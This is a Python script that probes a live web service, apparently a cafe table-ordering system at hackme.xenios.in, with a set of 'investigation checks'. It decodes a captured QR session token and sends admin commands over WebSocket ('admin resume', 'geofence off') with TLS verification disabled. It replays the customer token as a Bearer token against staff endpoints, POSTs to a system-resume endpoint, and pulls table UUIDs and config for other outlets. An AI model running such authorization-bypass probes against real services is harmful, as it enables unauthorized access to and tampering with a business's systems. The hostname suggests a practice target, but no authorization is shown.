#!/usr/bin/env python3
"""Run all 6 investigation checks and save results."""

import subprocess, json, ssl, os, base64

folder = "/workspaces/cafe/investigation"

# 1. Read the token
with open(f"{folder}/qr_sess_token.txt") as f:
    token = f.read().strip()
print(f"1. Token: {token[:30]}...{token[-20:]} ({len(token)} chars)")

# Decode the payload
parts = token.split('.')
payload_b64 = parts[0]
sig_b64 = parts[1]
def fix_b64(s):
    s = s.replace('-','+').replace('_','/')
    pad = 4 - len(s) % 4
    if pad != 4: s += '=' * pad
    return s
payload = json.loads(base64.urlsafe_b64decode(fix_b64(payload_b64)))
sig_bytes = base64.urlsafe_b64decode(fix_b64(sig_b64))
print(f"   Payload: {payload}")
print(f"   Signature (hex): {sig_bytes.hex()}")

# 2. Already saved
print("\n2. JS bundles: saved in js_bundles.txt")

# 3. WebSocket interaction
print("\n3. WebSocket interaction...")
try:
    import websocket
    ws = websocket.create_connection("wss://hackme.xenios.in/ws", 
                                      sslopt={"cert_reqs": ssl.CERT_NONE},
                                      timeout=3)
    ws.settimeout(3)
    messages = [
        {"type": "ping"},
        {"type": "getStatus"},
        {"type": "admin", "action": "resume"},
        {"type": "unpause"},
        {"type": "geofence", "mode": "off"},
    ]
    ws_results = []
    for msg in messages:
        try:
            ws.send(json.dumps(msg))
            ws_results.append(f"Sent: {msg}")
            resp = ws.recv()
            ws_results.append(f"  Response: {resp}")
        except Exception as e:
            ws_results.append(f"Sent: {msg} -> No response ({str(e)[:50]})")
    ws.close()
    
    # Try with token as query param
    try:
        ws2 = websocket.create_connection(
            f"wss://hackme.xenios.in/ws?token={token[:20]}",
            sslopt={"cert_reqs": ssl.CERT_NONE},
            timeout=3
        )
        ws2.settimeout(3)
        ws2.send(json.dumps({"type": "ping"}))
        try:
            resp = ws2.recv(timeout=2)
            ws_results.append(f"\nWith token param - Response: {resp}")
        except:
            ws_results.append("\nWith token param - No response")
        ws2.close()
    except Exception as e:
        ws_results.append(f"\nWith token param - Failed: {str(e)[:60]}")
    
    result = "\n".join(ws_results)
    with open(f"{folder}/websocket.txt", "w") as f:
        f.write(result)
    print(result)
except ImportError:
    msg = "websocket-client not installed"
    print(msg)
    with open(f"{folder}/websocket.txt", "w") as f:
        f.write(msg)

# 4. Bearer token on staff endpoints
print("\n4. Bearer token on staff endpoints...")
results = []
auth_header = f"Authorization: Bearer {token}"

for endpoint in ["/api/orders", "/api/tables", "/api/floor", "/api/system/resume", 
                  "/api/system/pause", "/api/config", "/api/outlet"]:
    r = subprocess.run(
        ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
         f"https://hackme.xenios.in{endpoint}",
         "-H", auth_header],
        capture_output=True, text=True, timeout=10)
    results.append(f"GET {endpoint} -> {r.stdout.strip()}")

# POST methods
for endpoint in ["/api/system/resume"]:
    r = subprocess.run(
        ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
         "-X", "POST", f"https://hackme.xenios.in{endpoint}",
         "-H", auth_header,
         "-H", "Content-Type: application/json",
         "-d", "{}"],
        capture_output=True, text=True, timeout=10)
    results.append(f"POST {endpoint} -> {r.stdout.strip()}")

result = "\n".join(results)
print(result)
with open(f"{folder}/staff_bearer.txt", "w") as f:
    f.write(result)

# 5. DEMOB table UUIDs
print("\n5. DEMOB table UUIDs...")
r = subprocess.run(
    ["curl", "-s", "--max-time", "3", 
     "https://hackme.xenios.in/api/watch/floor?outlet=DEMOB"],
    capture_output=True, text=True, timeout=5)
result = r.stdout
print(result[:600] if result else "No response")
with open(f"{folder}/demob_uuids.txt", "w") as f:
    f.write(result)

# Also try with Bearer token
r2 = subprocess.run(
    ["curl", "-s", "--max-time", "3",
     "https://hackme.xenios.in/api/tables?outlet=DEMOB",
     "-H", auth_header],
    capture_output=True, text=True, timeout=5)
print(f"Tables DEMOB with token: {r2.stdout[:300] if r2.stdout else 'empty'}")
with open(f"{folder}/demob_uuids.txt", "a") as f:
    f.write(f"\n\nWith token:\n{r2.stdout}")

# 6. Outlet config endpoints
print("\n6. Outlet config endpoints...")
results = []
for ep in ["/api/outlet/config", "/api/outlet/geofence", 
            "/api/outlet/DEMOB/config", "/api/outlet/DEMOA/config"]:
    r = subprocess.run(
        ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
         f"https://hackme.xenios.in{ep}"],
        capture_output=True, text=True, timeout=10)
    results.append(f"{ep} -> {r.stdout.strip()}")

result = "\n".join(results)
print(result)
with open(f"{folder}/outlet_config.txt", "w") as f:
    f.write(result)

print("\n=== All checks done ===")